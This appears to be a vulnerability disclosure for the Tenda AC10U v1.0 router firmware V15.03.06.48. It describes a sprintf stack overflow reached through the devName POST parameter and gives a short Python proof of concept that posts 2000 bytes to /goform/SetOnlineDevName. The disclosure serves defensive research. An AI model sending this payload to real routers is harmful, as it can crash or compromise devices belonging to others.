## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `formSetDeviceName` function. The `dev_name` variable receives the `devName` parameter from a POST request and is passed to function `set_device_name`. In this function, `dev_name` is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `devName` can trigger this security vulnerability.

![image-20240313233244036](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313233244036.png)

![image-20240313233530157](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313233530157.png)

![image-20240313233346293](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313233346293.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*2000

data = {"mac": 1,"devName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313233758387](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313233758387.png)